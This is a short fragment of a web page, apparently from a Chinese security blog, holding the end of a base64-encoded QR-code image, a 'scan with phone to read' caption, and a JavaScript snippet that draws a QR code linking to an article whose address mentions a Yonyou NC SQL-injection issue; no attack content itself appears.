A5zH3hajPXPYh8rBjzsuHeznY/1jo71GoHjKIPuJs4mWOjeJkEDWwo3gZ7Bz0vvLZ3FfYfmRlwfJfdwJrIKdn//vJ9ra3Lq3rU82aI955oTXys8F+fc1bazzilT/LKS+rGscZIfaRueqrl6zyMNZKN7NaqxiiHgLF2dYN8Um8CbYXdYhpwX2s30N+QmpuFls/y1UOYl9HPFBTwy+pwMC5yHuBXQO9X7WOM0LUZM6+16jovHDdEJ3CG1kbSJ3aWXy0f4inA3a0dtbPOdj1MPetrZj7nuWkq/kcQ6ybOfuqlTmG+1rXnCFEP2D9Yvh4s492Q7wv2KcFvW/NHdQTlQ36XrDHWXfle23Y66H3rTFC5Ge9rTnLQdRXrWMhhAZ6VM4GkXNszGsPA7Fo4WtOYA3kNed+uOq3DMRXLq8CcT0h0JoZQmigx1m/zFXfvSv/3THEPr2esK4hTlZ5xRD18qt9y0Bq0xV//QS+dSB6Imx3tgT9k1JrIfIw/0ut9UYIvdeGPjYvhMhBoDgZRAwonJrXmyZPSNcZZ9JvHchsgcV97gSGgXh6M/xM61oPtD9bQPhHGvOz9SBqnYOIYbxF1sz6VQ6ij2uERxoILexorREipz42GDnnjMNAnFj4mhNoA4GYHlzjna1C38c1foKEEBrnjBC8NDYIrmocZ4Re6xwED5ga/k1YSzwdYLvVT3f79F5muAnSl5nGXJJtLsQ6wPrTyePNPtoNebN9/bXb+R8AAAD//6fFHMIAAAAGSURBVAMAKQR4m+xqmjQAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-mp-view-pageName-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 